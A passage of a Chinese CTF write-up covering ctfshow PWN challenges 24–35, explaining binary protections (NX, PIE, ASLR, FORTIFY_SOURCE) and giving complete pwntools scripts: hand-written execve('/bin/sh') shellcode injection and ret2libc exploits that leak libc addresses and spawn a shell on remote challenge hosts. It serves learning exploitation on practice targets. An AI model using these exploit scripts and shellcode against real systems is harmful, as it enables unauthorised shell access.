架构程序中ctfshow函数）\nchecksec一下：记住上面的参数，后面写exp要用\u0026hellip;\n可知，对这些保护有点遗忘的可以回去看PWN-1的Linux安全保护机制\n保护项 状态 对利用的影响 Arch i386-32-Little 32 位 x86 架构，shellcode 需用 32 位版本（对应shellcraft.i386.sh()） Canary（栈溢出保护） No canary found 无栈溢出保护，缓冲区溢出后可直接覆盖栈上数据（无需绕过 canary） NX（栈不可执行） NX disabled 栈段可执行，shellcode 直接放在栈上就能运行（无需 ROP 绕过 NX） PIE（地址随机化） No PIE (0x8048000) 程序地址固定，ctfshow函数、buf缓冲区地址不会变（无需泄露地址） RWX segments Has RWX segments 存在 “可读可写可执行” 的内存段，进一步确保 shellcode 能正常执行 总结：程序保护机制极弱，直接用 “栈溢出注入 shellcode” 即可，无需复杂绕过。\n回到本题目，在nc连接之后交互一会发现并无实际效果，PWN大致思路是找到后门函数或者系统调用函数进行提权，提权之后就进行交互去执行一些靶机的终端命令例如：cat ctfshow_flag、ls之类的。那在此之前都得先找到这“后门”，也就是/bin/sh、zsh、system函数等等，但我发现这个程序并无这些地址存在，所以说这个程序从被制造出来都没想过要执行这些有关提权的代码\u0026hellip;..\n因为NX、canary没开、又有RWX，注入一段我们设计的有关执行/bin/sh的exp还是可以的，大致思路有了，接下来开始执行吧。\n围绕 “直接执行 shellcode” 设计方案\n可以用pwntools的脚本啊，单纯直接调用函数的，而且pwntools有局限啊，就那用这个pwntools的shellcraft模块生成的shellcode比较晦涩难懂，而且注释放到Kali上比较杂乱，而且没有涉及到汇编语言调用，比较简单我就不用了，我这里手敲shellcode方便大家了解一下底层逻辑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * # 导入 pwntools 库 context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为调试模式 #io = process(\u0026#39;./pwn\u0026#39;) # 本地连接 io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28176) # 远程连接 shellcode = asm( \u0026#39;\u0026#39;\u0026#39; mov eax, 0xb mov ecx, 0 mov edx, 0 push 0x0068732f push 0x6e69622f mov ebx, esp int 0x80 \u0026#39;\u0026#39;\u0026#39;) # 生成一个 Shellcode io.sendline(shellcode) # 将生成的 Shellcode 发送到目标 io.interactive() 创建一个python文件，输入这些代码放到终端上运行，记得提前打开另外一个窗口进行nc连接远程靶机。\n上面其它的python代码没啥可讲的，这是远程交互的模板代码，直接套就好，我现在重在讲解这个手搓的shellcode，它和shellcraft模块产生的shellcode效果一样的，而且还好看懂：\n1 2 3 4 5 6 7 8 mov eax, 0xb ; syscall号：11对应execve mov ecx, 0 ; argv参数为NULL mov edx, 0 ; envp参数为NULL push 0x0068732f ; 压栈字符串\u0026#34;/sh\\0\u0026#34;（小端序存储） push 0x6e69622f ; 压栈字符串\u0026#34;/bin\u0026#34;（小端序存储） mov ebx, esp ; ebx指向栈顶的\u0026#34;/bin/sh\u0026#34;字符串地址 int 0x80 ; 触发系统调用 这 7 行代码通过精准设置寄存器和栈数据，完成了execve系统调用的参数准备，最终实现 “用/bin/sh替换当前进程” 的效果，是 CTF 中获取 shell 的基础手段，逻辑清晰且精简（仅 23 字节）。\n逐行解析手敲shellcode 思路：注入一段能执行/bin/sh的汇编语言代码\n① mov eax, 0xb\neax寄存器在 32 位 Linux 系统调用中专门用于传递 “系统调用号”（告诉内核要执行哪个系统调用）。 0xb是十六进制，转换为十进制是11，而11正是execve系统调用对应的编号（内核通过这个值识别要执行execve）。 ② mov ecx, 0\necx寄存器用于传递execve的第二个参数argv（参数列表）。 传0（即NULL）表示 “没有参数”，等价于在命令行直接输入/bin/sh（不带任何参数）。 ③ mov edx, 0\nedx寄存器用于传递execve的第三个参数envp（环境变量列表）。 传0（即NULL）表示 “没有环境变量”，内核会使用默认环境变量。 ④ push 0x0068732f\npush指令将数据压入栈中（栈是向下增长的内存区域）。\n1 0x0068732f 是十六进制的 “小端序” 存储（x86 架构默认小端序，即低地址存低位字节），转换为 ASCII 码：\n0x2f → / 0x73 → s 0x68 → h 0x00 → 字符串结束符\\0 所以这行实际是往栈上压入字符串\u0026quot;/sh\\0\u0026quot;。 ⑤ push 0x6e69622f\n同样是压栈操作，0x6e69622f转换为 ASCII 码：\n0x2f → / 0x62 → b 0x69 → i 0x6e → n 所以这行往栈上压入字符串\u0026quot;/bin\u0026quot;。 结合上一行，栈上现在的内容是\u0026quot;/bin/sh\\0\u0026quot;（因为栈先压入\u0026quot;/bin\u0026quot;，再压入\u0026quot;/sh\\0\u0026quot;，栈顶到栈底的顺序就是/b/i/n//s/h/\\0）。\n⑥ mov ebx, esp\nesp是栈指针寄存器，永远指向当前栈顶的地址。 经过两次push后，栈顶正好是\u0026quot;/bin/sh\\0\u0026quot;字符串的起始地址（第一个字符'/'的位置）。 这行指令将栈顶地址存入ebx，而ebx寄存器在execve系统调用中用于传递第一个参数filename（程序路径），所以ebx现在指向我们要执行的\u0026quot;/bin/sh\u0026quot;。 ⑦ int 0x80\nint是中断指令，0x80是 Linux 系统调用的中断号。 执行这条指令会触发一个软中断，让 CPU 从用户态切换到内核态，内核会根据eax中的系统调用号（11）执行execve，并使用ebx、ecx、edx中的参数。 总之：必须要定义好这几个寄存器，在最底层操作系统运行时都会用到的，这里不详细讲述，反正你知道这几个寄存器一开始就得这么定义就好啦。（不耐烦了）\n1 2 3 mov eax, 0xb mov ecx, 0 mov edx, 0 push压栈时要记得字节限制，因为架构是x32，所以push最多4个字节，也就是push两个：/bin、/sh的地址（不满四个字节如/sh要记得用00填满哦不然会报错）\n然后就是记得esp寄存器是动态的\u0026hellip;\n这是调用pwntools的shellcraft模块的exp：\n1 2 3 4 5 6 7 from pwn import * context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为debug，会输出详细的交互过程 #io = process(\u0026#39;./pwn\u0026#39;) # 本地调试时启用，用于启动本地的pwn程序 io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28183) # 连接远程目标服务，地址为pwn.challenge.ctf.show，端口28183 shellcode = asm(shellcraft.sh()) # 生成一个执行/bin/sh的shellcode io.sendline(shellcode) # 将shellcode发送给目标服务 io.interactive() # 进入交互模式，允许用户与目标服务进行交互（如执行命令） 这是它的shellcode（原版未修改过，直接复制粘贴上来的）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* execve(path=\u0026#39;/bin///sh\u0026#39;, argv=[\u0026#39;sh\u0026#39;], envp=0) */ /* push b\u0026#39;/bin///sh\\x00\u0026#39; */ push 0x68 push 0x732f2f2f push 0x6e69622f mov ebx, esp /* push argument array [\u0026#39;sh\\x00\u0026#39;] */ /* push \u0026#39;sh\\x00\\x00\u0026#39; */ push 0x1010101 xor dword ptr [esp], 0x1016972 xor ecx, ecx push ecx /* null terminate */ push 4 pop ecx add ecx, esp push ecx /* \u0026#39;sh\\x00\u0026#39; */ mov ecx, esp xor edx, edx /* call execve() */ push 11 /* 0xb */ pop eax int 0x80 看着确实比较乱\u0026hellip;..😅\n最后的最后我想对这题做些评价，其实题不难主要是我初次做，讲得比较啰嗦，如果你会手敲shellcode或者调用pwntools的shellcraft模块的话还是很简单秒掉的。只能怪小生太cai了😄\n大致思路知道就好，靶机的flag是动态变化的。\nPWN_025（待定） 题目：开启NX保护，或许可以试试ret2libc\nPWN_025\n根据题目，也就是说具体攻击手法为：ret2libc\nret2libc 是一种在二进制漏洞利用中的经典技术，全称为 “return - to - libc”，中文可理解为 “返回至 libc 库”，常用于绕过栈不可执行（NX，No - eXecute）保护机制。\nret2libc实现步骤 信息泄漏：通过栈溢出漏洞，结合一些函数（如 write 函数），泄漏出程序中 libc 库函数的真实地址。因为在不同系统中，libc 库加载的基地址是随机的（ASLR 保护机制），但库内函数之间的相对偏移是固定的，所以需要先获取一个已知函数（比如 write ）的真实地址，进而计算出其他函数（如 system ）的地址。 计算关键地址：根据泄漏出的 libc 函数地址，计算出 system 函数地址和 /bin/sh 字符串在内存中的地址。由于 libc 中函数和字符串的相对位置固定，所以可以通过已知函数地址与偏移量来计算其他关键地址。 构造 payload：再次利用栈溢出漏洞，构造合适的 payload。payload 一般包含填充数据（用于填满缓冲区直到覆盖返回地址）、system 函数地址（覆盖返回地址，使程序返回时跳转到 system 函数）、一个无效的返回地址（system 函数执行完后要返回的地址，随便填充一个地址，因为获取到 shell 后通常不会再关注这个返回操作 ）、/bin/sh 字符串的地址（作为 system 函数的参数，这样 system 函数执行时就相当于执行了 system(\u0026quot;/bin/sh\u0026quot;) ，从而打开一个 shell ）。 发送 payload：将构造好的 payload 发送给存在漏洞的程序，使程序按照攻击者期望的流程执行，最终获取到一个交互式 shell，达到漏洞利用的目的。 checksec一下，发现开了MX保护，也就是说不能用shellcode了。\n跟进ctfshow函数：\n可以发现buf大小为 132 字节，但read允许读取 0x100（256）字节存在栈溢出漏洞。\nIDAx32分析，也没有/bin/sh、后门system：\n这时候就需要使用利用libc（动态链接库）的system函数和/bin/sh字符串（这题思路很类似PWN_024的编写shellcode一样，程序本身没有后门可入只能从外部链接进这些函数，从而达到进入交互\u0026hellip;），这些东西在程序运行时的真实地址计算方法为：@got真实地址 = libc基址 + 偏移，所以要先计算出偏移。\n以write函数为例 ，偏移 = 真实地址 - libc基址，真实地址存在write@got、write@got可以通过write@plt来运行这个函数从而泄露出来，libc 版本和基址可以导入 libcSearcher 库来查找计算这里需要去系统学习一下动态链接的过程（有关.got、.plt表的知识），简单画个图说明一下黄色部分是静态的，绿色部分是动态变化的：\nelf.got[\u0026lsquo;write\u0026rsquo;]的作用是获取 write函数真实地址的存储位置，即write@got的地址；\nelf.plt[\u0026lsquo;write\u0026rsquo;]的作用是获取 write函数跳板地址的存储位置，即write@plt的地址；\n具体思路：\n解析目标程序的 ELF 文件，读取write@plt的地址 、write@got的地址和ctfshow的函数地址。 以栈溢出漏洞作为入口，跳转到write@plt执行函数泄露write@got的地址，再跳转回ctfshow函数。 读取泄露出的write@got的地址，用 libcSearcher 库查找正确的 libc 版本，再计算偏移。 计算system函数和/bin/sh字符串的真实地址。 继续从ctfshow函数里的栈溢出作为入口，跳转到system函数真实地址，同时将/bin/sh作为参数传入，从而拿到权限。 \u0026hellip;.从CTFshow-PWN入门-pwn25分析ret2libc原理与实现 - Claire_cat - 博客园\nret2libc攻击（即先找到栈溢出漏洞，通过write函数泄露 write 函数的真实地址，根据泄露的 write 函数地址，使用 LibcSearcher 来搜索 libc 库中相应的函数地址和字符串地址，获取 system 函数和\u0026quot;/bin/sh\u0026quot; 字符串的地址。构造新的 payload，使用泄露的 system 函数和 \u0026ldquo;/bin/sh\u0026rdquo; 字符串的地址来进行get shell）\nexp备注版：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 from pwn import * # 导入pwntools库，提供漏洞利用常用功能（如连接、打包等） from LibcSearcher import * # 导入LibcSearcher，用于根据泄露的函数地址查找对应libc版本 context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为debug，显示详细的交互过程（方便调试） # 建立与目标服务的连接（远程服务器地址和端口） io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28298) # 加载目标二进制文件，获取符号信息（如函数地址、GOT表地址等） elf = ELF(\u0026#39;./pwn\u0026#39;) # 获取main函数的地址（用于第一次溢出后跳回main函数，进行二次攻击） main = elf.sym[\u0026#39;main\u0026#39;] # 获取write函数的GOT表地址（Global Offset Table，存储函数的真实内存地址） write_got = elf.got[\u0026#39;write\u0026#39;] # 获取write函数的PLT表地址（Procedure Linkage Table，用于间接调用函数） write_plt = elf.plt[\u0026#39;write\u0026#39;] # 构造第一次攻击的payload（栈溢出利用） # 1. 填充缓冲区到返回地址：0x88是缓冲区大小，0x4是ebp寄存器大小（32位程序） # 2. 返回地址：覆盖为write@plt（调用write函数输出数据） # 3. write执行完后跳转的地址：main函数（回到程序开头，方便第二次攻击） # 4. write函数的参数1：文件描述符0（错误！应为1，stdout标准输出，否则无法正确泄露数据） # 5. write函数的参数2：要泄露的地址（write@got，存储write的真实内存地址） # 6. write函数的参数3：泄露的字节数（4字节，32位地址长度） payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4) # 发送第一次payload，触发栈溢出，执行write函数泄露地址 io.sendline(payload) # 接收泄露的write函数真实地址（4字节，32位），并转换为整数 write = u32(io.recv(4)) print(hex(write)) # 打印泄露的地址（十六进制） # 使用LibcSearcher根据write函数地址查找对应的libc版本 libc = LibcSearcher(\u0026#39;write\u0026#39;, write) # 计算libc的基地址：libc基地址 = 泄露的函数地址 - 该函数在libc中的偏移量 libc_base = write - libc.dump(\u0026#39;write\u0026#39;) # 计算system函数的地址：system地址 = libc基地址 + system在libc中的偏移量 system = libc_base + libc.dump(\u0026#39;system\u0026#39;) # 计算\u0026#34;/bin/sh\u0026#34;字符串的地址：bin_sh地址 = libc基地址 + 字符串在libc中的偏移量 bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) # 构造第二次攻击的payload（获取shell） # 1. 同样的填充：覆盖缓冲区和ebp # 2. 返回地址：覆盖为system函数地址（调用system执行命令） # 3. system执行完后跳转的地址：main函数（可选，不影响shell使用） # 4. system函数的参数：\u0026#34;/bin/sh\u0026#34;字符串的地址（执行该命令获取交互shell） payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh) # 发送第二次payload，触发栈溢出，执行system(\u0026#34;/bin/sh\u0026#34;) io.sendline(payload) # 进入交互模式，与获取的shell进行交互（输入命令等） io.interactive() 原版exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28298) elf = ELF(\u0026#39;./pwn\u0026#39;) main = elf.sym[\u0026#39;main\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] write_plt = elf.plt[\u0026#39;write\u0026#39;] payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4) io.sendline(payload) write = u32(io.recv(4)) print(hex(write)) libc = LibcSearcher(\u0026#39;write\u0026#39;,write) libc_base = write - libc.dump(\u0026#39;write\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh) io.sendline(payload) io.interactive() 这里的内容为后续栈部分讲解内容，目前WP在前面不做详细讲解，目的仅为了演示在开启某些保护可以使用哪些攻击手法（好吧其实我也不会，这些是抄的wp，这里等我学会栈这部分我再来解决，PWN确实入门比较难，深入学更难\u0026hellip;.）\n感觉强度上来了，做得有点吃力。\nPWN_026 题目：设置好 ASLR 保护参数值即可获得flag。为确保flag正确，本题建议用提供虚拟机运行。 PWN libc-2.27.so （提取码show）\n这题坑到我了，运行程序发现直接爆flag，交上去发现是假的/(ㄒoㄒ)/~~\nIDAx64分析，有system后门函数：\n而且可以知道这个flag是有几个printf、puts共同打印出的、字符串由地址拼接（%p打印指针或者地址，以16进制形式）而成。\n运行一下：\n每次flag都不一样，说明地址一直在变化，也就是地址随机化。\n在Linux保护机制有讲过ASLR，关于ASLR保护可以看回PWN-1：ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置。\ngdb调试一下，题目早给出了2，在这里单纯演示一下；\n1 gdb -q pwn 1 shell cat /proc/sys/kernel/randomize_va_space 虽然 checksec 输出中没有直接的 ASLR 开启状态，但可以结合系统层面的设置（通过 cat/proc/sys/kernel/randomize_va_space 查看，输出 0 表示关闭 ASLR，1 表示部分开启，2 表示完全开启 ）来判断程序运行时的 ASLR 情况。\n既然地址随机化保护，我们就把它关掉（记得提权root）：\n1 echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space 这里有个点就是我的flag是ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbf6b0}\n但不知为啥和官方不一样flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}\n但我的程序运行了三次，ASRL也关了，flag出来的是一样的，代表地址是真实的，flag没错的。反正大体思路是正确的。\n总之记住：/proc/sys/kernel/randomize_va_space\nPWN_027 题目：设置好 ASLR 保护参数值即可获得flag。libc-2.27.so PWN\n这题也是一样的，”If the result is 0 or 1, then you get the correct flag!“将ASLR保护的数值改成1或0就好。（套上题的公式）\n怪怪的：\n官方flag是ctfshow{0x400687_0x400560_0x603260}\n欸我发现\u0026hellip;.0x603260的后面的6变成a了，有点招笑\u0026hellip;应该是Kali环境和Ubuntu不同，我去网上查了下，发现大部分PWN的WP都是用Ubuntu解的：\n这里的flag就是正常的了。从现在开始我将彻底使用Ubuntu了。\nPWN_028 题目：设置好 ASLR 保护参数值即可获得flag；libc-2.27.so、 PWN （show）\n这题送分的，ASLR直接关的，flag还是地址拼出来的，那flag就不变得就是真的了。不信可以多运行几次，你看flag会变吗？\nflag is :ctfshow{0x400687_0x400560}\nPWN_029 题目：ASLR和PIE开启后；libc-2.27.so、 PWN\n试着ASLR和PIE保护开启后，地址都会将随机化，这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构，也就是相对偏移是不会变化的。\n1 sysctl -w kernel.randomize_va_space=2 #完全打开ASLR保护 直接运行\u0026hellip;\u0026hellip;\nflag（有点长但是对的\u0026hellip;）：ctfshow{Address_Space_Layout_Randomization\u0026amp;\u0026amp;Position-Independent_Executable_1s_C0000000000l!}\n这题只是让你了解下ASLR和PIE保护的特点，flag不是目的：\nPWN_030 题目：关闭PIE后；程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。 PWN_030\nchecksec一下：没开canary和PIE，开了NX不好用Shellcode。\nIDAx32看一下：\nbuf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 。调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准输入。第二个参数是指向存储数据的缓冲区的指针，这里是 \u0026amp;buf 。第三个参数是要读取的最大字节数，这里是 0x100u ，即 256 字节，但这char定义buf是132字节，所以存在栈溢出漏洞。\n并无找到后门/bin/sh，通过ret2libc，那从栈溢出下手：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 from pwn import * context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为debug，显示详细调试信息 context.arch = \u0026#39;i386\u0026#39; # 指定目标程序为32位架构 # 连接远程目标服务器，若本地调试可切换为process io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28121) # io = process(\u0026#39;./pwn\u0026#39;) # 加载目标程序和对应的libc库 elf = ELF(\u0026#39;./pwn\u0026#39;) # 加载漏洞程序 libc = ELF(\u0026#39;/home/ctfshow/libc/32bit/libc-2.27.so\u0026#39;) # 加载对应的libc库 # 获取关键地址 write_plt = elf.sym[\u0026#39;write\u0026#39;] # 从程序符号表获取write函数的PLT地址（用于调用） write_got = elf.got[\u0026#39;write\u0026#39;] # 从程序全局偏移表获取write函数的GOT地址（存储真实地址） ctfshow = elf.sym[\u0026#39;ctfshow\u0026#39;] # 获取存在栈溢出的ctfshow函数地址（用于二次溢出） offset = 140 # 溢出偏移：缓冲区大小 + EBP长度，通过调试确定 # 构造第一个payload：泄漏write函数的真实地址 payload1 = flat( b\u0026#39;A\u0026#39; * offset, # 填充缓冲区直到覆盖返回地址 p32(write_plt), # 覆盖返回地址为write@plt，调用write函数 p32(ctfshow), # write执行完后跳回ctfshow函数，以便再次接收输入 p32(1), # write函数第1个参数：文件描述符1（标准输出） p32(write_got), # write函数第2个参数：要读取的地址（write的GOT表项） p32(4) # write函数第3个参数：读取字节数（32位地址占4字节） ) # 发送第一个payload，触发write函数泄漏地址 io.send(payload1) # 接收泄漏的write函数真实地址（4字节，32位） write_addr = u32(io.recv(4)) log.success(\u0026#34;write address: %#x\u0026#34; % write_addr) # 打印获取到的write地址 # 计算libc基地址及关键函数地址 libc_base = write_addr - libc.sym[\u0026#39;write\u0026#39;] # libc基地址 = write真实地址 - libc中write的偏移 system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] # system函数地址 = 基地址 + system在libc中的偏移 # /bin/sh字符串地址 = 基地址 + /bin/sh在libc中的偏移 binsh_addr = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) # 打印计算得到的关键地址（调试用） log.success(\u0026#34;libc base: %#x\u0026#34; % libc_base) log.success(\u0026#34;system address: %#x\u0026#34; % system_addr) log.success(\u0026#34;/bin/sh address: %#x\u0026#34; % binsh_addr) # 构造第二个payload：调用system(\u0026#34;/bin/sh\u0026#34;)获取shell payload2 = flat( b\u0026#39;B\u0026#39; * offset, # 再次填充缓冲区到返回地址 p32(system_addr), # 覆盖返回地址为system函数地址 p32(0xdeadbeef), # system执行后的返回地址（随意填充，不影响功能） p32(binsh_addr) # system函数的参数：/bin/sh字符串地址 ) # 发送第二个payload，触发system调用 io.send(payload2) # 进入交互模式，与获取到的shell进行交互 io.interactive() 无备注代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 write_got = elf.got[\u0026#39;write\u0026#39;] ctfshow = elf.sym[\u0026#39;ctfshow\u0026#39;] offset = 140 payload1 = flat( b\u0026#39;A\u0026#39; * offset, p32(write_plt), p32(ctfshow), p32(1), p32(write_got), p32(4) ) io.send(payload1) write_addr = u32(io.recv(4)) log.success(\u0026#34;write address: %#x\u0026#34; % write_addr) libc_base = write_addr - libc.sym[\u0026#39;write\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) log.success(\u0026#34;libc base: %#x\u0026#34; % libc_base) log.success(\u0026#34;system address: %#x\u0026#34; % system_addr) log.success(\u0026#34;/bin/sh address: %#x\u0026#34; % binsh_addr) payload2 = flat( b\u0026#39;B\u0026#39; * offset, p32(system_addr), p32(0xdeadbeef), p32(binsh_addr) ) io.send(payload2) io.interactive() 需要注意的点：\n1 2 3 4 # 获取关键地址 write_plt = elf.sym[\u0026#39;write\u0026#39;] # 从程序符号表获取write函数的PLT地址（用于调用） write_got = elf.got[\u0026#39;write\u0026#39;] # 从程序全局偏移表获取write函数的GOT地址（存储真实地址） ctfshow = elf.sym[\u0026#39;ctfshow\u0026#39;] # 获取存在栈溢出的ctfshow函数地址（用于二次溢出） 这里的地址是可以手写的，但我不建议，AI给的是确切地址，这里我给改了，下次AI写脚本，地址一定不要手动硬写出来，帮AI改一下改成自动获取的，比如上面这样，系统会自动获取地址的，这样比较准确不会出错崩溃。\n说实话，给我肯定写不到的，不熟悉编写python远程交互脚本，但我可以读懂，我可以用AI帮我写代码，我就把意愿告诉它，把IDA汇编代码以及跟进的函数复制发给它，附上我的思路，不如已经知道是利用栈溢出漏洞编写ret2libc、知道开启了哪些保护、一步步修改得到的。\nPWN_031（待定） 题目：开启 ASLR 和 PIE 的情况下，仍可能被利用； PWN_031\nchecksec一下，无栈保护：\n跟进ctfshow函数：\n发现同样的代码，有溢出，似乎可用上题的exp，不过checksec看到的保护是不一样的，exp肯定不一样了\u0026hellip;.\n运行之后莫名其妙，会有报随机化的地址：\n\u0026hellip;..深入分析CTFshow-PWN入门-pwn31的解法与原理 - Claire_cat - 博客园\n这题和PWN_025差不多，有关栈溢出的知识点，这里先跳\u0026hellip;\nFORTIFY缓冲区边界检查 FORTIFY_SOURCE 是 GCC 提供的一种轻量级缓冲区溢出保护机制，通过对危险函数（如 strcpy、memcpy 等）进行增强检查，降低缓冲区溢出漏洞的利用风险。它有 3 个级别：_FORTIFY_SOURCE=0（关闭）、_FORTIFY_SOURCE=1（基础保护）、_FORTIFY_SOURCE=2（强化保护），各级别区别如下：\n级别 启用条件 核心检查逻辑 防护范围 性能影响 0 默认（无需定义宏） 无任何检查，使用原始函数 无 无 1 -D_FORTIFY_SOURCE=1 -O1 检查 “源长度 \u0026lt; 目标缓冲区长度”（仅限编译期可知） 部分静态场景 极小 2 -D_FORTIFY_SOURCE=2 -O2 检查 “操作长度 ≤ 目标缓冲区实际大小”（含运行时） 静态 + 动态场景，覆盖更多函数 轻微 FORTIFY_SOURCE 仅能防护部分已知的危险函数，无法替代 NX、Stack Canary 等更全面的保护机制。 必须配合优化选项（-O1/-O2）才能生效，否则编译器会忽略该宏定义。 对于动态分配的内存（如 malloc 分配的缓冲区），FORTIFY_SOURCE 无法获取其大小，因此无法防护相关操作（如 memcpy(malloc_buf, src, n)）。 PWN_032 题目：FORTIFY_SOURCE=0：\n禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。\n这题主要是在函数逻辑运行，知道运行的原理就好。\nIDA分析main：\n跟进undefined函数：\n可以看到，关键在于成功进入到undefined函数才有机会下一步获得flag：\n从main函数出发：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 __fastcall main(int argc, const char **argv, const char **envp) { __gid_t v3; // eax const char *v4; // rax int v5; // eax int num; // [rsp+4h] [rbp-44h] BYREF char buf2[11]; // [rsp+Ah] [rbp-3Eh] BYREF char buf1[11]; // [rsp+15h] [rbp-33h] BYREF v3 = getegid(); setresgid(v3, v3, v3); logo(); v4 = argv[1]; *(_QWORD *)buf1 = *(_QWORD *)v4;//指针 *(_WORD *)\u0026amp;buf1[8] = *((_WORD *)v4 + 4);//指针 buf1[10] = v4[10]; strcpy(buf2, \u0026#34;CTFshowPWN\u0026#34;); printf(\u0026#34;%s %s\\n\u0026#34;, buf1, buf2); v5 = strtol(argv[3], 0LL, 10); memcpy(buf1, argv[2], v5); strcpy(buf2, argv[1]); printf(\u0026#34;%s %s\\n\u0026#34;, buf1, buf2); fgets(buf1, 11, _bss_start); printf(buf1, \u0026amp;num); if ( argc \u0026gt; 4 ) Undefined(); return 0; } 大致是：起初先打印ctfshow的logo信息（其实一开始那个v3把我搞懵了，其实对解题过程没啥帮助的），在最顶端的__fastcall main已经把一些参数给定义了比如argv数组，第一个参数argv[1]被赋给v4，v4作中介把数值传递给了buf1，之后程序将v4[10]数组内容赋值给buf1[10]，接着通过strcpy函数，把字符串“CTFshowPWN”复制/赋值给buf2，printf打印buf1、buf2的当前的字符串内容，最后fget读取_bss_start的11个字符给buf1，打印buf1和num的信息，最后通过if判断argc是否大于4(默认情况下argc是等于1的，因为argv[0]必定存在，我们输入一个参数，argc就会等于2，依次递推)，大于4就进入undefined函数内\n因为本题目FORTIFY_SOURCE没有开启，代表我们启动函数直接输入4个参数(这时argc=5 \u0026gt; 4，为什么五个？因为你输入的4个+argc[0] = 5)就行了，而且这4个参数没有长度限制，如果开启FORTIFY_SOURCE就不好说了，因为开启了之后，由于程序存在strcpy和memcpy函数会检测长度，如果长度超过了限制，可能会使程序抛出异常而退出执行。\nPWN_033 题目：FORTIFY_SOURCE=1：\n启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。 PWN_033\nIDAx64分析：\nFORTIFY_SOURCE被打开了，代码和PWN_032几乎一样的，memcpy和strcpy这两个函数被替换成了__mencpy_chk和__strcpy__chk安全函数，可以看到这两个函数相比前两个函数只是加上了11LL这个参数加以限制，因为buf1和buf2在声明的时候的长度就是11，所以程序为了防止溢出，使用后两个函数加上这两个数组的长度加以限制以防溢出。\n但这不妨碍我们拿flag啊，只要运行./pwnme时输入的字符总长度不超过11就好：\n1 2 # argv[1] 长度≤10，argv[3] ≤11，总参数≥5 $./pwnme \u0026#34;short\u0026#34; \u0026#34;a\u0026#34; \u0026#34;5\u0026#34; \u0026#34;d\u0026#34; \u0026#34;e\u0026#34; PWN_034 题目：FORTIFY_SOURCE=2：\n启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。\nIDA分析，题目描述也说了该程序包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。 使用ida64反编译的加过略微与前两道题目有所不同，大部分还是一样的，还是把危险函数替换成了安全函数。如下：\n大致能看出原函数是什么吧，这里就不多解释了\u0026hellip;\n# 格式化函数与解题操作说明 __printf__chk 函数与 printf 的区别在于：不能使用 %x$n 不连续地打印，也就是说如果要使用 %3$n，则必须同时使用 %1$n 和 %2$n。在使用 %n 的时候会做一些检查。 这涉及到格式化字符串漏洞，但本题不涉及此漏洞，所以对本道题几乎没有阻碍。后续我们还是通过 SSH 连接后运行文件，输入 4 个长度为 1 的参数，不出意外就能拿到 flag！\n栈溢出 PWN_035 题目：正式开始栈溢出了，先来一个最最最最简单的吧\n用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接\n1 ssh ctfshow@题目地址 -p题目端口号 **不是nc连接 